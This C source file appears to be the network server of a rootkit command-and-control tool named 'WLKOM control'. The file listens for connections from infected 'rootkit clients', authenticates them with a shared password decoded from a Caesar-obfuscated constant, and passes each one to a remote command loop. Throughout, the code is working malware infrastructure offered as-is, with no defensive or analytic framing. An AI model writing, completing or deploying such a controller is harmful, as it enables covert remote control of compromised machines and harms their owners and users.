#include "../include/network.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "../include/commands.h"

#define MAX_CLIENTS    5
#define TIMESTAMP_SIZE 32

/**
 * @brief Prints a timestamped log message to stdout.
 * @param fmt  printf-style format string.
 */
static void log_event(const char *fmt, ...)
{
    time_t      t;
    struct tm  *tm_ptr;
    char        ts[TIMESTAMP_SIZE];
    va_list     ap;

    t      = time(NULL);
    tm_ptr = localtime(&t);
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", tm_ptr);
    printf("[%s] ", ts);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

/**
 * @brief Sends the shared password to the rootkit and waits for "OK".
 * @param c  Client with an open file descriptor.
 * @return 0 if authentication succeeded, -1 otherwise.
 */
static int do_auth(client_t *c)
{
    const char *pass = decrypt_caesar(WLKOM_PASSWORD);
    uint8_t     opcode;
    char       *payload = NULL;
    uint32_t    plen    = 0;

    if (send_packet(c->fd, CMD_AUTH, pass, strlen(pass)) < 0)
    {
        log_event("Failed to send auth\n");
        return -1;
    }
    if (recv_packet(c->fd, &opcode, &payload, &plen) < 0)
    {
        log_event("No auth response\n");
        return -1;
    }
    if (opcode != CMD_AUTH || !payload || strncmp(payload, "OK", 2) != 0)
    {
        log_event("Auth failed: %s\n", payload ? payload : "null");
        free(payload);
        return -1;
    }
    free(payload);
    return 0;
}

/**
 * @brief Authenticates then drives the command loop for a single rootkit client.
 *        Frees @p c before returning.
 * @param c  Heap-allocated client descriptor (ownership transferred).
 */
static void handle_client(client_t *c)
{
    log_event("New connection from %s:%d\n", c->remote_ip, c->remote_port);
    c->connected = 1;
    c->authed    = 0;

    if (do_auth(c) == 0)
    {
        c->authed = 1;
        log_event("Rootkit authenticated from %s:%d\n",
                  c->remote_ip, c->remote_port);
        commands_loop(c);
    }

    c->connected = 0;
    c->authed    = 0;
    close(c->fd);
    log_event("Disconnected from %s:%d\n", c->remote_ip, c->remote_port);
    free(c);
}

/**
 * @brief Accepts one incoming connection and returns a heap-allocated client.
 * @param srv_fd  Listening server socket.
 * @return Pointer to a new client_t, or NULL on error.
 */
static client_t *accept_client(int srv_fd)
{
    struct sockaddr_in client_addr;
    socklen_t          addr_len = sizeof(client_addr);
    int                client_fd;
    client_t          *c;

    client_fd = accept(srv_fd, (struct sockaddr *)&client_addr, &addr_len);
    if (client_fd < 0)
    {
        perror("accept");
        return NULL;
    }
    c = malloc(sizeof(*c));
    if (!c)
    {
        close(client_fd);
        return NULL;
    }
    c->fd          = client_fd;
    c->connected   = 0;
    c->authed      = 0;
    c->remote_port = ntohs(client_addr.sin_port);
    inet_ntop(AF_INET, &client_addr.sin_addr, c->remote_ip, sizeof(c->remote_ip));
    return c;
}

int server_init(int port)
{
    struct sockaddr_in addr;
    int                srv_fd;
    int                opt = 1;

    srv_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (srv_fd < 0)
    {
        perror("socket");
        return -1;
    }
    setsockopt(srv_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);
    if (bind(srv_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        perror("bind");
        close(srv_fd);
        return -1;
    }
    if (listen(srv_fd, MAX_CLIENTS) < 0)
    {
        perror("listen");
        close(srv_fd);
        return -1;
    }
    log_event("WLKOM control listening on port %d\n", port);
    return srv_fd;
}

void server_run(int srv_fd)
{
    client_t *c;

    while (1)
    {
        c = accept_client(srv_fd);
        if (c)
            handle_client(c);
    }
}

void server_close(int srv_fd)
{
    close(srv_fd);
}
